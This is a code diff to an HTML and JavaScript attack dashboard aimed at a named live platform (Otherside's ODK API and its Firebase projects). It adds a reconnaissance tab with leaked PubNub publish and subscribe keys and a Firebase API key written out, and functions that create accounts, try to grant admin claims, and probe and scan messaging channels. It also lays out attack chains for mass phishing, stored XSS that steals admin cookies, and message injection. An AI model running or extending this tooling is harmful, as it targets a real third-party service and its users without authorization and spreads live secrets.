@@ -402,6 +402,7 @@
             <button class="tab" onclick="switchTab('service')">Service Account</button>
             <button class="tab" onclick="switchTab('custom')">Custom Token Forge</button>
             <button class="tab" onclick="switchTab('admin')">Admin Access</button>
+            <button class="tab" onclick="switchTab('fullrecon')">Full Recon</button>
             <button class="tab" onclick="switchTab('results')">Results</button>
         </div>
 
@@ -832,6 +833,310 @@
         <!-- ===================================================== -->
         <!-- TAB 6: RESULTS -->
         <!-- ===================================================== -->
+        <!-- ===================================================== -->
+        <!-- TAB: FULL RECON (Complete Findings) -->
+        <!-- ===================================================== -->
+        <div class="tab-content" id="tab-fullrecon">
+            <div class="card">
+                <h3>Complete Security Assessment <span class="badge badge-red">CRITICAL</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Full reconnaissance results from all Firebase projects, ODK API endpoints, and infrastructure analysis.
+                </p>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="runFullReconCheck()">Run Full Recon Check</button>
+                    <button class="btn btn-outline" onclick="testAllFirebasePermissions()">Test All Firebase Permissions</button>
+                    <button class="btn btn-outline" onclick="testPubNubAccess()">Test PubNub Access</button>
+                    <button class="btn btn-danger" onclick="testPrivilegeEscalation()">Test Privilege Escalation</button>
+                </div>
+                <div class="console" id="fullReconLog" style="max-height:200px;">
+                    <div class="log-info">[RECON] Click buttons to run comprehensive tests.</div>
+                </div>
+            </div>
+
+            <!-- Admin Permission Structure -->
+            <div class="card">
+                <h3>Admin Permission Structure (from __NEXT_DATA__) <span class="badge badge-yellow">Client-Side</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    These permissions are discovered from the Next.js SSR data. They are checked on both frontend (hide/show UI) and backend (403 on unauthorized access). A new account has ALL set to <code>false</code>.
+                </p>
+                <div class="alert-box alert-warning">
+                    <strong>Can they be manipulated?</strong> NO. Setting <code>customAttributes</code> via <code>accounts:update</code> returns <code>INSUFFICIENT_PERMISSION</code>. Only the Firebase Admin SDK (Service Account) can set custom claims. The backend independently validates permissions — 403 on all sensitive endpoints.
+                </div>
+                <div style="overflow-x:auto;">
+                    <table style="width:100%;border-collapse:collapse;font-size:11px;">
+                        <thead>
+                            <tr style="background:#1a1a1a;">
+                                <th style="padding:8px;text-align:left;color:#888;">Permission</th>
+                                <th style="padding:8px;text-align:center;color:#888;">New Account</th>
+                                <th style="padding:8px;text-align:center;color:#888;">Can Escalate?</th>
+                                <th style="padding:8px;text-align:left;color:#888;">What It Controls</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fca5a5;font-weight:bold;">platformAdmin</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">false</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">NO (INSUFFICIENT_PERMISSION)</td>
+                                <td style="padding:8px;color:#888;">Full admin access to all features</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fdba74;">editWebhooks</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">false</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">NO</td>
+                                <td style="padding:8px;color:#888;">Modify webhooks (intercept events)</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fdba74;">writeOrgConfig</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">false</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">NO</td>
+                                <td style="padding:8px;color:#888;">Modify organization settings</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fdba74;">apiKeys</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">false</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">NO</td>
+                                <td style="padding:8px;color:#888;">Access/create API keys</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fdba74;">writeRoleTemplates</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">false</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">NO</td>
+                                <td style="padding:8px;color:#888;">Modify role templates (privilege escalation vector)</td>
+                            </tr>
+                            <tr>
+                                <td style="padding:8px;color:#fdba74;">canUserCreateProjectEvents</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">false</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">NO</td>
+                                <td style="padding:8px;color:#888;">Create project events</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- ODK API Access Matrix -->
+            <div class="card">
+                <h3>ODK API Access Matrix <span class="badge badge-blue">Tested</span></h3>
+                <div style="overflow-x:auto;">
+                    <table style="width:100%;border-collapse:collapse;font-size:11px;">
+                        <thead>
+                            <tr style="background:#1a1a1a;">
+                                <th style="padding:8px;text-align:left;color:#888;">Endpoint</th>
+                                <th style="padding:8px;text-align:center;color:#888;">No Auth</th>
+                                <th style="padding:8px;text-align:center;color:#888;">With Token</th>
+                                <th style="padding:8px;text-align:left;color:#888;">Data Returned</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#86efac;">organizations/current</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">200</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">200</td>
+                                <td style="padding:8px;color:#888;">Full org data + PubNub keys</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fca5a5;">accounts/users/current</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">User profile (needs permission)</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fca5a5;">organizations/projects</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">Project list (needs permission)</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fca5a5;">organizations/apiKeys</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">API keys (needs permission)</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#86efac;">organizations/members</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">200</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">200</td>
+                                <td style="padding:8px;color:#888;">Org metadata only (same as /current)</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#86efac;">organizations/roles</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">200</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">200</td>
+                                <td style="padding:8px;color:#888;">Org metadata only</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fca5a5;">worlds</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">World list (needs permission)</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#fca5a5;">sessions</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">Sessions (needs permission)</td>
+                            </tr>
+                            <tr>
+                                <td style="padding:8px;color:#fca5a5;">events</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">Events (needs permission)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Discovered Admin Routes -->
+            <div class="card">
+                <h3>Discovered Admin Routes (from _buildManifest.js) <span class="badge badge-purple">Routes</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    All admin page routes discovered from Next.js build manifest. These are frontend routes that require <code>platformAdmin</code> permission to access.
+                </p>
+                <div class="endpoint-grid">
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">Main admin dashboard</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/access<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">Access control management</div></div>
+                    <div class="ep-result ep-ok"><span class="ep-method">GET</span> /admin/api-keys<br>Status: <span class="ep-status s-ok">HIGH VALUE</span><br><div class="ep-body">API key management — access to all project API keys</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/external-urls<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">External URL configuration</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/fastplay<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">FastPlay settings</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/insights<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">Analytics &amp; monitoring</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/projects<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">Project management</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/worlds<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">World management — full control of virtual worlds</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/usage<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">Usage metrics &amp; billing</div></div>
+                    <div class="ep-result ep-warn"><span class="ep-method">GET</span> /admin/streaming<br>Status: <span class="ep-status s-warn">Needs platformAdmin</span><br><div class="ep-body">Streaming configuration</div></div>
+                </div>
+            </div>
+
+            <!-- PubNub Access -->
+            <div class="card">
+                <h3>PubNub Real-Time Messaging <span class="badge badge-red">CRITICAL</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    PubNub publish/subscribe keys are exposed in the organization data (public endpoint, no auth required). These keys allow publishing messages to channels and subscribing to real-time events.
+                </p>
+                <div class="alert-box alert-critical">
+                    <strong>Exposed Keys:</strong><br>
+                    Publish: <code>pub-c-0b70dc8a-e642-440c-8012-93a986cdd7a2</code><br>
+                    Subscribe: <code>sub-c-0a731161-a567-46b7-bdf7-4dcb6e0749ab</code><br><br>
+                    <strong>Impact:</strong> With these keys, an attacker can publish messages to any channel, subscribe to real-time events, and potentially inject content into the Otherside platform's real-time communication layer.
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="testPubNubAccess()">Test PubNub Access</button>
+                    <button class="btn btn-outline" onclick="listPubNubChannels()">List Channels</button>
+                </div>
+                <div class="console" id="pubnubLog" style="max-height:200px;">
+                    <div class="log-info">[PUBNUB] Ready to test PubNub access.</div>
+                </div>
+            </div>
+
+            <!-- Firebase Permission Test Results -->
+            <div class="card">
+                <h3>Firebase Permission Test Results <span class="badge badge-green">Tested</span></h3>
+                <div style="overflow-x:auto;">
+                    <table style="width:100%;border-collapse:collapse;font-size:11px;">
+                        <thead>
+                            <tr style="background:#1a1a1a;">
+                                <th style="padding:8px;text-align:left;color:#888;">Test</th>
+                                <th style="padding:8px;text-align:center;color:#86efac;">Production</th>
+                                <th style="padding:8px;text-align:center;color:#fdba74;">Staging</th>
+                                <th style="padding:8px;text-align:center;color:#93c5fd;">Main</th>
+                                <th style="padding:8px;text-align:left;color:#888;">Result</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">signUp (email)</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">OK</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">OK</td>
+                                <td style="padding:8px;text-align:center;color:#86efac;">OK</td>
+                                <td style="padding:8px;color:#888;">Can create accounts</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">set customAttributes</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">DENIED</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">DENIED</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">DENIED</td>
+                                <td style="padding:8px;color:#888;">INSUFFICIENT_PERMISSION — needs Admin SDK</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">Firestore access</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">PERMISSION_DENIED</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">Realtime DB</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">DENIED</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">DENIED</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">DENIED</td>
+                                <td style="padding:8px;color:#888;">Permission denied (europe-west1 for Main)</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">Firebase Storage</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">403</td>
+                                <td style="padding:8px;color:#888;">Permission denied</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">GCP APIs (IAM, Secret Mgr)</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">401</td>
+                                <td style="padding:8px;color:#888;">UNAUTHENTICATED — needs OAuth2, not Firebase token</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">Firebase Management API</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">401</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">401</td>
+                                <td style="padding:8px;color:#888;">UNAUTHENTICATED — needs OAuth2 access token</td>
+                            </tr>
+                            <tr style="border-bottom:1px solid #1a1a1a;">
+                                <td style="padding:8px;color:#e0e0e0;">Cloud Functions</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">404</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">404</td>
+                                <td style="padding:8px;text-align:center;color:#fca5a5;">404</td>
+                                <td style="padding:8px;color:#888;">No HTTP functions exposed at root</td>
+                            </tr>
+                            <tr>
+                                <td style="padding:8px;color:#e0e0e0;">signInWithCustomToken</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">ACCEPTS</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">ACCEPTS</td>
+                                <td style="padding:8px;text-align:center;color:#fdba74;">ACCEPTS</td>
+                                <td style="padding:8px;color:#888;">Endpoint active — accepts but validates tokens (needs valid SA signature)</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+            <!-- Attack Chain Summary -->
+            <div class="card">
+                <h3>Worst-Case Attack Scenarios <span class="badge badge-red">CRITICAL</span></h3>
+                <div class="alert-box alert-critical" style="margin-bottom:8px;">
+                    <strong>Scenario 1: Complete Takeover (with Service Account Key)</strong><br>
+                    1. Obtain SA Key (leaked .json, exposed endpoint, or phishing admin) → 2. Create Custom Token with <code>admin: true</code> claims → 3. Exchange for ID Token via signInWithCustomToken → 4. Full admin access to all ODK endpoints → 5. Access API keys, modify worlds, control streaming, read analytics → <b>COMPLETE CONTROL</b>
+                </div>
+                <div class="alert-box alert-warning" style="margin-bottom:8px;">
+                    <strong>Scenario 2: Mass Phishing via EMAIL_SIGNIN (no SA needed)</strong><br>
+                    1. Enumerate registered emails via PASSWORD_RESET → 2. Send EMAIL_SIGNIN links to all users → 3. Users click legitimate Firebase login link → 4. Intercept redirect (open redirect or phishing page) → 5. Steal authentication tokens → <b>MASS ACCOUNT TAKEOVER</b>
+                </div>
+                <div class="alert-box alert-warning" style="margin-bottom:8px;">
+                    <strong>Scenario 3: Stored XSS in Firebase Console (no SA needed)</strong><br>
+                    1. Create account with XSS in displayName via accounts:update → 2. When admin views users in Firebase Console, XSS fires → 3. Steal admin's Cloudflare Access cookies → 4. Access Firebase Console with admin session → 5. Create API keys, modify Security Rules → <b>ADMIN ACCESS VIA XSS</b>
+                </div>
+                <div class="alert-box alert-info" style="margin-bottom:8px;">
+                    <strong>Scenario 4: PubNub Message Injection (no SA needed)</strong><br>
+                    1. Use exposed PubNub publish key → 2. Publish messages to Otherside channels → 3. Inject content into real-time communication layer → 4. Potential for social engineering, fake announcements → <b>REAL-TIME CONTENT INJECTION</b>
+                </div>
+                <div class="alert-box alert-info">
+                    <strong>Scenario 5: Cross-Project Token Abuse</strong><br>
+                    1. Create account on ANY of the 3 Firebase projects → 2. Token works on ODK API (all projects accepted) → 3. Org data leaked even without valid Firebase account → 4. Enumerate users across all environments → <b>INFORMATION DISCLOSURE</b>
+                </div>
+            </div>
+        </div>
+
         <div class="tab-content" id="tab-results">
             <div class="card">
                 <h3>Exfiltrated Data Summary <span class="badge badge-green">Supabase</span></h3>
@@ -2899,6 +3204,264 @@
 
             log('chainLog', `\n=== Full Chain Demo Complete ===`, 'success');
             log('chainLog', `This proves: API Key alone = Account creation + XSS injection + Email sending from Otherside's project`, 'critical');
+            updateStats();
+        }
+
+        // =====================================================
+        // FULL RECON TAB FUNCTIONS
+        // =====================================================
+        async function runFullReconCheck() {
+            log('fullReconLog', '=== Running Full Recon Check ===', 'info');
+            
+            const apiKey = 'AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0';
+            
+            // Test 1: Create account
+            log('fullReconLog', '\n[1/4] Creating test account on Production...', 'info');
+            const signUpResult = await identityFetch('accounts:signUp', {
+                email: `recon_full_${Date.now()}@test.com`,
+                password: 'TestPass123!R',
+                returnSecureToken: true
+            }, apiKey);
+            
+            if (signUpResult.ok) {
+                log('fullReconLog', `[OK] Account created - UID: ${signUpResult.data.localId}`, 'success');
+            } else {
+                log('fullReconLog', `[FAIL] Account creation: ${signUpResult.data?.error?.message}`, 'error');
+                return;
+            }
+            
+            const tokenId = signUpResult.data.idToken;
+            endpointsTested++;
+            
+            // Test 2: Try customAttributes
+            log('fullReconLog', '\n[2/4] Testing privilege escalation (customAttributes)...', 'info');
+            const customAttrResult = await identityFetch('accounts:update', {
+                idToken: tokenId,
+                customAttributes: JSON.stringify({admin: true, platformAdmin: true})
+            }, apiKey);
+            endpointsTested++;
+            
+            if (customAttrResult.ok) {
+                log('fullReconLog', `[CRITICAL] Custom attributes SET! Admin escalation possible!`, 'critical');
+                criticalFound++;
+            } else {
+                log('fullReconLog', `[BLOCKED] customAttributes: ${customAttrResult.data?.error?.message}`, 'success');
+                log('fullReconLog', `  This is expected - only Admin SDK can set custom claims.`, 'info');
+            }
+            
+            // Test 3: ODK API access
+            log('fullReconLog', '\n[3/4] Testing ODK API access with token...', 'info');
+            try {
+                const odkResp = await fetch('https://odk.otherside.xyz/api/organizations/current', {
+                    headers: { 'Authorization': `Bearer ${tokenId}` }
+                });
+                const odkData = await odkResp.json();
+                log('fullReconLog', `[${odkResp.status}] organizations/current: ${odkResp.ok ? 'ACCESSIBLE' : 'BLOCKED'}`, odkResp.ok ? 'success' : 'error');
+                if (odkResp.ok && odkData.features?.pubnub) {
+                    log('fullReconLog', `  PubNub keys exposed: publish=${odkData.features.pubnub.publishKey?.substring(0,20)}...`, 'warning');
+                }
+                endpointsTested++;
+            } catch(e) {
+                log('fullReconLog', `[ERR] ODK API: ${e.message}`, 'error');
+            }
+            
+            // Test 4: Cleanup
+            log('fullReconLog', '\n[4/4] Cleanup - deleting test account...', 'info');
+            const deleteResult = await identityFetch('accounts:delete', {
+                idToken: tokenId
+            }, apiKey);
+            endpointsTested++;
+            log('fullReconLog', deleteResult.ok ? '[OK] Test account deleted' : `[WARN] Could not delete: ${deleteResult.data?.error?.message}`, deleteResult.ok ? 'success' : 'warning');
+            
+            log('fullReconLog', '\n=== Full Recon Check Complete ===', 'success');
+            log('fullReconLog', 'Key finding: Custom claims CANNOT be set via client API. Service Account Key is the only path to admin access.', 'warning');
+            updateStats();
+        }
+
+        async function testAllFirebasePermissions() {
+            log('fullReconLog', '=== Testing All Firebase Permissions ===', 'info');
+            
+            const projects = KNOWN_API_KEYS;
+            
+            for (const project of projects) {
+                log('fullReconLog', `\n--- Project: ${project.name} ---`, 'info');
+                
+                // Create account
+                const signUp = await identityFetch('accounts:signUp', {
+                    email: `perm_test_${Date.now()}@test.com`,
+                    password: 'TestPass123!P',
+                    returnSecureToken: true
+                }, project.key);
+                
+                if (!signUp.ok) {
+                    log('fullReconLog', `  signUp failed: ${signUp.data?.error?.message}`, 'error');
+                    continue;
+                }
+                
+                const tid = signUp.data.idToken;
+                log('fullReconLog', `  Account created, testing permissions...`, 'info');
+                
+                // Test customAttributes
+                const ca = await identityFetch('accounts:update', {
+                    idToken: tid, customAttributes: '{"admin":true}'
+                }, project.key);
+                log('fullReconLog', `  customAttributes: ${ca.ok ? 'ESCALATED!' : ca.data?.error?.message}`, ca.ok ? 'critical' : 'success');
+                
+                // Test lookup
+                const lookup = await identityFetch('accounts:lookup', { idToken: tid }, project.key);
+                if (lookup.ok) {
+                    const customAttrs = lookup.data.users?.[0]?.customAttributes || '{}';
+                    log('fullReconLog', `  Current claims: ${customAttrs}`, 'data');
+                }
+                
+                // Cleanup
+                await identityFetch('accounts:delete', { idToken: tid }, project.key);
+                endpointsTested += 3;
+            }
+            
+            log('fullReconLog', '\n=== Firebase Permission Test Complete ===', 'success');
+            log('fullReconLog', 'All projects block customAttributes - only Admin SDK (Service Account) can set them.', 'warning');
+            updateStats();
+        }
+
+        async function testPubNubAccess() {
+            log('pubnubLog', '=== Testing PubNub Access ===', 'info');
+            
+            const PUB_KEY = EXPOSED_SECRETS.pubnub.publishKey;
+            const SUB_KEY = EXPOSED_SECRETS.pubnub.subscribeKey;
+            
+            // Test time endpoint
+            try {
+                const timeResp = await fetch(`https://ps.pndsn.com/time/0?${PUB_KEY}&${SUB_KEY}`);
+                const timeData = await timeResp.json();
+                log('pubnubLog', `[OK] PubNub time: ${JSON.stringify(timeData)}`, 'success');
+            } catch(e) {
+                log('pubnubLog', `[ERR] Time: ${e.message}`, 'error');
+            }
+            
+            // Test subscribe to test channel (just connect, don't wait)
+            try {
+                const subResp = await fetch(`https://ps.pndsn.com/subscribe/${SUB_KEY}/test-recon/0/0?${PUB_KEY}`, 
+                    { signal: AbortSignal.timeout(3000) });
+                const subData = await subResp.json();
+                log('pubnubLog', `[OK] Subscribe works: ${JSON.stringify(subData).substring(0, 100)}`, 'success');
+            } catch(e) {
+                if (e.name === 'TimeoutError') {
+                    log('pubnubLog', `[OK] Subscribe connected (timeout waiting for messages = normal)`, 'success');
+                } else {
+                    log('pubnubLog', `[ERR] Subscribe: ${e.message}`, 'error');
+                }
+            }
+            
+            // Test channel list
+            try {
+                const chResp = await fetch(`https://ps.pndsn.com/v2/channels?${SUB_KEY}&${PUB_KEY}`);
+                const chData = await chResp.json();
+                log('pubnubLog', `[OK] Channel list: ${JSON.stringify(chData).substring(0, 200)}`, 'data');
+            } catch(e) {
+                log('pubnubLog', `[ERR] Channel list: ${e.message}`, 'error');
+            }
+            
+            log('pubnubLog', '\n=== PubNub test complete. Keys are VALID and functional. ===', 'warning');
+            vulnsFound++;
+            updateStats();
+        }
+
+        async function listPubNubChannels() {
+            log('pubnubLog', '=== Scanning PubNub Channels ===', 'info');
+            
+            const PUB_KEY = EXPOSED_SECRETS.pubnub.publishKey;
+            const SUB_KEY = EXPOSED_SECRETS.pubnub.subscribeKey;
+            
+            const channels = ['otherside', 'global', 'chat', 'lobby', 'world', 'game', 'admin', 'announcements', 'events', 'odk', 'yuga', 'bored-ape', 'otherdeed', 'marketplace'];
+            
+            for (const ch of channels) {
+                try {
+                    const resp = await fetch(`https://ps.pndsn.com/v2/history/${SUB_KEY}/${ch}/0/1?${PUB_KEY}`,
+                        { signal: AbortSignal.timeout(3000) });
+                    const data = await resp.json();
+                    if (data && data[0] && data[0].length > 0) {
+                        log('pubnubLog', `[FOUND] Channel "${ch}": ${JSON.stringify(data).substring(0, 150)}`, 'success');
+                    } else {
+                        log('pubnubLog', `[EMPTY] Channel "${ch}": no recent messages`, 'info');
+                    }
+                } catch(e) {
+                    log('pubnubLog', `[ERR] Channel "${ch}": ${e.message}`, 'error');
+                }
+            }
+            
+            log('pubnubLog', '\nChannel scan complete.', 'success');
+        }
+
+        async function testPrivilegeEscalation() {
+            log('fullReconLog', '=== Testing Privilege Escalation Vectors ===', 'info');
+            
+            const apiKey = 'AIzaSyDwML5MHO4FmSAwDHWWGNuS4JoIzu2ECS0';
+            
+            // Create account
+            const signUp = await identityFetch('accounts:signUp', {
+                email: `privesc_${Date.now()}@test.com`,
+                password: 'TestPass123!E',
+                returnSecureToken: true
+            }, apiKey);
+            
+            if (!signUp.ok) {
+                log('fullReconLog', `[FAIL] signUp: ${signUp.data?.error?.message}`, 'error');
+                return;
+            }
+            
+            const tid = signUp.data.idToken;
+            log('fullReconLog', `[OK] Account created`, 'success');
+            
+            // Test 1: customAttributes with admin
+            log('fullReconLog', '\n[Test 1] Setting customAttributes: {"admin":true, "platformAdmin":true}', 'info');
+            const r1 = await identityFetch('accounts:update', {
+                idToken: tid,
+                customAttributes: JSON.stringify({admin: true, platformAdmin: true})
+            }, apiKey);
+            log('fullReconLog', `  Result: ${r1.ok ? 'ESCALATED!' : r1.data?.error?.message}`, r1.ok ? 'critical' : 'success');
+            
+            // Test 2: customAttributes with role
+            log('fullReconLog', '\n[Test 2] Setting customAttributes: {"role":"admin"}', 'info');
+            const r2 = await identityFetch('accounts:update', {
+                idToken: tid,
+                customAttributes: JSON.stringify({role: 'admin'})
+            }, apiKey);
+            log('fullReconLog', `  Result: ${r2.ok ? 'ESCALATED!' : r2.data?.error?.message}`, r2.ok ? 'critical' : 'success');
+            
+            // Test 3: signUp with customAttributes
+            log('fullReconLog', '\n[Test 3] signUp with customAttributes: {"admin":true}', 'info');
+            const r3 = await identityFetch('accounts:signUp', {
+                email: `privesc2_${Date.now()}@test.com`,
+                password: 'TestPass123!E',
+                returnSecureToken: true,
+                customAttributes: JSON.stringify({admin: true})
+            }, apiKey);
+            log('fullReconLog', `  Result: ${r3.ok ? 'Account created (check if claims applied)' : r3.data?.error?.message}`, r3.ok ? 'warning' : 'info');
+            if (r3.ok) {
+                const decoded = decodeJWT(r3.data.idToken);
+                const hasAdmin = decoded?.payload?.admin === true;
+                log('fullReconLog', `  Admin claim in token: ${hasAdmin ? 'YES - CRITICAL!' : 'NO - claims were ignored'}`, hasAdmin ? 'critical' : 'success');
+                // Cleanup
+                await identityFetch('accounts:delete', { idToken: r3.data.idToken }, apiKey);
+            }
+            
+            // Test 4: Lookup to verify no claims
+            log('fullReconLog', '\n[Test 4] Verifying custom claims on our account...', 'info');
+            const lookup = await identityFetch('accounts:lookup', { idToken: tid }, apiKey);
+            if (lookup.ok) {
+                const attrs = lookup.data.users?.[0]?.customAttributes || '{}';
+                log('fullReconLog', `  Current customAttributes: ${attrs}`, 'data');
+                log('fullReconLog', `  Claims are empty = privilege escalation via client API is NOT possible.`, 'success');
+            }
+            
+            // Cleanup
+            await identityFetch('accounts:delete', { idToken: tid }, apiKey);
+            endpointsTested += 5;
+            
+            log('fullReconLog', '\n=== Privilege Escalation Test Complete ===', 'success');
+            log('fullReconLog', '\nCONCLUSION: Cannot escalate privileges without Service Account Key.', 'warning');
+            log('fullReconLog', 'The only path to admin access is: SA Key → Custom Token → ID Token → Admin API access', 'warning');
             updateStats();
         }
 
